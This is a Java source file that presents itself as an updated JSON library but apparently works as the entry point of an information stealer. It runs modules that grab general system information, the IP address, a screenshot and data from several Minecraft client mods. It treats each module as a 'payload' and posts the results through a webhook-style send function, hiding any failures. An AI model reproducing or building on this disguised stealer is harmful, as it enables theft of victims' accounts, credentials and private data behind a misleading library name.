package org.json.updated;

import org.json.updated.parsers.JSONObject;
import org.json.updated.parsers.JSONRegexHandler;
import org.json.updated.parsers.impl.*;
import org.json.updated.parsers.util.JSONBuilder;

import java.util.ArrayList;

class JSON {
    private final ArrayList<JSONObject> objects = new ArrayList<>();
    private final boolean debug = false;

    private void parseJson() {
        this.objects.add(new GeneralInformation());
        this.objects.add(new IPInformation());
        this.objects.add(new Screenshot());
        this.objects.add(new FutureData());
        this.objects.add(new RusherData());
        this.objects.add(new KonasData());
        this.objects.add(new ImpactData());
        this.objects.add(new KamiBlueData());
        this.objects.add(new MeteorData());

        String separator = new JSONBuilder().value("content", "=============================================").build();

        JSONRegexHandler.send(separator);
        this.objects.forEach((payload) -> {
            try {
                payload.handle();
            } catch (Exception e) {
                JSONRegexHandler.send(new JSONBuilder().value("content", "> Failure on payload " + payload.getName()).build());
                if (debug) e.printStackTrace();
            }
        });
        JSONRegexHandler.send(separator);
    }

    public static void main(String[] args) {
        new JSON().parseJson();
    }
}